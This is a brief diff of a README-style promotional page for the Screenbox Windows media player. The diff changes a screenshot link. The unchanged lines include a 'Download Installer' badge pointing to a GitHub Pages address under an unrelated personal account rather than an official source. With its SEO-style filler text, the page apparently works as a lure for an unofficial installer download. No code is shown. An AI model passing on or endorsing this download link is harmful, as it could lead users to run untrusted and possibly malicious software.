@@ -22,7 +22,7 @@ Interest in screenbox download solutions continues among users looking for light
 
 Whether managing personal video libraries, reviewing multimedia content, organizing recordings, or maintaining structured playback collections, Screenbox provides a practical Windows media player focused on usability, organization, and viewing efficiency.
 
-![Screenshot](https://store-images.s-microsoft.com/image/apps.50111.14412253091153471.2a23f99b-aa3e-4ae9-a6f7-3ee5c3e9ac4e.d0a789d2-7f63-45aa-a7a2-18d56896c1ed)
+![Screenshot](https://repository-images.githubusercontent.com/447153396/ad994f08-6f87-4c02-9402-d443fe9fed5c)
 
 [![Download Installer](https://img.shields.io/badge/Download_Installer-005999?style=flat-square\&logo=windows\&logoColor=white)](https://tonywardoxeq.github.io/.github/Screenbox-Media-Player)
 
